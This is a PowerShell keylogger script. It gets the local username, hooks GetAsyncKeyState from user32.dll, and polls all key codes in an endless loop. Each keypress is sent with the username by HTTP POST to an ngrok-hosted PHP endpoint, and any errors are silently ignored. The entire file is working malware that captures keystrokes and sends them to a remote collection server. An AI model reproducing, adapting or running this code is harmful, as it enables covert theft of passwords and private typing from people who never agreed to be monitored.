# gets the username of the
$user = Get-LocalUser | Where-Object Enabled | Select-Object Name
write-host $user.Name
$Signature = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);
'@
Add-Type -MemberDefinition $Signature -Name Keyboard -Namespace PsOneApi
do
{
    for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = [PsOneApi.Keyboard]::GetAsyncKeyState($ascii)
        if ($state -eq -32767){
            Write-Host $ascii
            $Url = "http://b534-2a02-c7e-5678-da00-6b65-33cf-60a1-1afb.ngrok.io/keylogRecive.php"
            $Body = @{
                key = $ascii
                user = $user.Name
            }
            try{
                Invoke-WebRequest -Method 'Post' -Uri $url -Body $body -TimeoutSec 1
            }
            Catch [system.exception]{
            }
        }
    }

    Start-Sleep -Milliseconds 1

} while($true)